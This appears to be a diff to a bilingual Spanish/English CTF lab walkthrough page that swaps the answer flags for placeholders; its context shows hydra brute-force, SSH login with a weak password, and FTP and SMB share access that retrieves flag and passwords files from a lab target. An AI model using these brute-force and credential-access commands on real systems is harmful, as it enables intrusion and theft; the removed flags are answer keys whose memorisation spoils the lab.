@@ -148,7 +148,7 @@ hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
     <h4>Acceso y Flag</h4>
     <pre><code class="language-bash"># Accede al login en el navegador: http://TARGET_IP/bruteforce
 # La flag aparece automáticamente en el navegador al hacer login correcto
-🚩 HL{http_brut3f0rc3_w3b_l0gin_succ3ss}</code></pre>
+🚩 HL{···}</code></pre>
 
     <h3>🔒 SSH (puerto 22)</h3>
     <h4>Bruteforce — Hydra / Medusa / ncrack</h4>
@@ -167,7 +167,7 @@ run</code></pre>
     <h4>Acceso y Flag</h4>
     <pre><code class="language-bash">ssh admin@TARGET_IP          # password: password1
 cat user.txt
-🚩 HL{ssh_brut3f0rc3_l0gin_succ3ss}</code></pre>
+🚩 HL{···}</code></pre>
 
     <h3>📁 FTP (puerto 21)</h3>
     <h4>Bruteforce — Hydra / Medusa / ncrack</h4>
@@ -191,7 +191,7 @@ run</code></pre>
 ftp> get ftp_flag.txt
 ftp> bye
 cat ftp_flag.txt
-🚩 HL{ftp_cr3d3nti4ls_r3us3d}</code></pre>
+🚩 HL{···}</code></pre>
 
     <h3>🖧 SMB (puerto 445)</h3>
     <h4>Bruteforce — Hydra / CrackMapExec</h4>
@@ -210,13 +210,13 @@ smbclient -L //TARGET_IP -U admin%password1</code></pre>
     <pre><code class="language-bash"># Share: hacklabs (accesible por todos los usuarios)
 smbclient //TARGET_IP/hacklabs -U admin%password1
 smb: \> get flag.txt
-🚩 HL{smb_sh4r3_3num3r4ti0n_succ3ss}
+🚩 HL{···}
 
 # Share: admin_backup (solo admin)
 smbclient //TARGET_IP/admin_backup -U admin%password1
 smb: \> get root.txt
 smb: \> get passwords.txt
-🚩 HL{4dm1n_b4ckup_3xf1ltr4ti0n}</code></pre>
+🚩 HL{···}</code></pre>
   </div>
 
   <div class="lang-content" data-lang="en" style="display:none">
@@ -242,7 +242,7 @@ hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
     <h4>Access &amp; Flag</h4>
     <pre><code class="language-bash"># Open the login in your browser: http://TARGET_IP/bruteforce
 # The flag appears automatically in the browser after a successful login
-🚩 HL{http_brut3f0rc3_w3b_l0gin_succ3ss}</code></pre>
+🚩 HL{···}</code></pre>
 
     <h3>🔒 SSH (port 22)</h3>
     <h4>Bruteforce — Hydra / Medusa / ncrack</h4>
@@ -261,7 +261,7 @@ run</code></pre>
     <h4>Access &amp; Flag</h4>
     <pre><code class="language-bash">ssh admin@TARGET_IP          # password: password1
 cat user.txt
-🚩 HL{ssh_brut3f0rc3_l0gin_succ3ss}</code></pre>
+🚩 HL{···}</code></pre>
 
     <h3>📁 FTP (port 21)</h3>
     <h4>Bruteforce — Hydra / Medusa / ncrack</h4>
@@ -285,7 +285,7 @@ run</code></pre>
 ftp> get ftp_flag.txt
 ftp> bye
 cat ftp_flag.txt
-🚩 HL{ftp_cr3d3nti4ls_r3us3d}</code></pre>
+🚩 HL{···}</code></pre>
 
     <h3>🖧 SMB (port 445)</h3>
     <h4>Bruteforce — Hydra / CrackMapExec</h4>
@@ -304,13 +304,13 @@ smbclient -L //TARGET_IP -U admin%password1</code></pre>
     <pre><code class="language-bash"># Share: hacklabs (all users)
 smbclient //TARGET_IP/hacklabs -U admin%password1
 smb: \> get flag.txt
-🚩 HL{smb_sh4r3_3num3r4ti0n_succ3ss}
+🚩 HL{···}
 
 # Share: admin_backup (admin only)
 smbclient //TARGET_IP/admin_backup -U admin%password1
 smb: \> get root.txt
 smb: \> get passwords.txt
-🚩 HL{4dm1n_b4ckup_3xf1ltr4ti0n}</code></pre>
+🚩 HL{···}</code></pre>
   </div>
 </div>
 {% endif %}
